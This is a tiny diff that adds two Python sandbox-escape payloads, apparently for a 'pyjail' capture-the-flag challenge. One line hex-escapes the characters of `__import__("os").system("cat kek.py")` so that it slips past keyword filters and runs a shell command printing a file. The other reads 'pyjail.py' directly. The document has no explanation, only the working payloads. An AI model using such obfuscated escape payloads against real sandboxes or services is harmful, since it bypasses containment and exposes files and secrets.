@@ -1,0 +1,2 @@
+\x5f\x5fim\x70ort\x5f\x5f(\x22os\x22).s\x79stem(\x22cat\x20kek.py\x22)
+file('pyjail.py').read()
